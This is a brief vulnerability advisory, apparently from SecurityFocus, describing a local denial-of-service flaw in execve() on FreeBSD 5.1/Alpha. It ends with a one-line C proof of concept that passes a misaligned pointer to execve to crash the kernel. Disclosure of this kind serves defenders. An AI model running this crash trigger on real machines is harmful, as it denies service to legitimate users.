source: http://www.securityfocus.com/bid/10596/info


It is reported that FreeBSD running on the Alpha architecture is susceptible to a denial of service vulnerability in its execve() system call.

An attacker with local interactive user-level access on an affected machine is reportedly able to crash FreeBSD when running on the Alpha architecture, denying service to legitimate users.

FreeBSD 5.1-RELEASE/Alpha is reported vulnerable, other architectures with strict memory alignment requirements are also likely vulnerable. IA32 is reported immune. Versions other than 5.1-RELEASE are likely affected as well. 

/*
 * FreeBSD/Alpha local DoS
 *    by Marceta Milos
 *    root@marcetam.net
 *
 */

char main() { execve("/bin/ls",(int *)(main + 1), 0); }